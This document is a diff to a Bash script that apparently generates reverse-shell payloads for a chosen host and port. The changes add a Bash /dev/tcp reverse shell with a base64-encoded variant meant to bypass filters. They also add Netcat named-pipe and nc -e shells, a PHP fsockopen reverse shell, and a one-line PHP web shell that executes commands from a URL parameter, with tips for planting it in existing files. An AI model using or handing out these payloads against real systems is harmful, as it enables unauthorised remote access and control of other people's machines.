@@ -152,13 +152,24 @@ then
 
 elif [ $mode == 2 ]
 then
-	echo -e "\nOutputting a basic Bash payload for $host:$port\n\n" 
-	echo -e "bash -i >& /dev/tcp/$host/$port 0>&1"
+	echo -e "\nOutputting Bash payloads for $host:$port\n\n" 
+	echo -e "[!] Tip: URL-Encoding the Basic Payload can break it. Try the B64 Payload if you need to URL-Encode it, or bypass basic filters\n\n"
+
+	basic="bash -i >& /dev/tcp/$host/$port 0>&1"
+
+	b64=$(echo -n "$basic" | base64)
+
+	echo -e "Basic Payload:\n$basic"
+
+	echo -e "\n\nB64 Payload:\necho $b64|base64 -d|bash"
+
 
 elif [ $mode == 3 ]
 then
 	echo -e "\nOutputting Netcat payloads for a Linux target using $host:$port\n\n[!] Tip: Named Pipe Payload is preferred and Alternate Payload only works for certain versions of Netcat\n\n"
+
 	echo -e "Named Pipe Payload:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $host $port >/tmp/f\n\n"
+
 	echo -e "Alternate Payload:\nnc -e /bin/sh $host $port"
 
 elif [ $mode == 4 ]
@@ -212,8 +223,15 @@ then
 
 elif [ $mode == 6 ]
 then
-	echo -e "\n[!] Tip: You can use PHP to execute other payloads by placing them inside the exec() or system() functions. These payloads are for a Linux target.\n\n"
-	echo -e "Outputting PHP payloads for $host:$port\n\nBasic Payload (String):\n"
+
+	echo -e "\n{Generic Web Shell Payload}\n\n"
+	echo -e "[!] Tip: This is the smallest possible payload, & it should work on any PHP server.\n\nIf you're adding the payload to an existing file, append the PHP closing tags ?>\n\nNavigate to the file's URL to execute commands (e.g. https://example.com/shell.php?0=whoami)\n\nTiny Payload:\n"
+
+	echo '<=`$_GET[0]`'
+
+	echo -e "$line\n{Linux Payloads}\n\n"
+	echo -e "[!] Tip: You can use PHP to execute other payloads by placing them inside the exec() or system() functions (e.g. for a Windows Target).\n"
+	echo -e "Outputting PHP payloads for $host:$port\n\n\nBasic Payload (String):\n"
 
 	echo "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 	echo -e "\n\nAlternate Payload (PHP tags):\n"
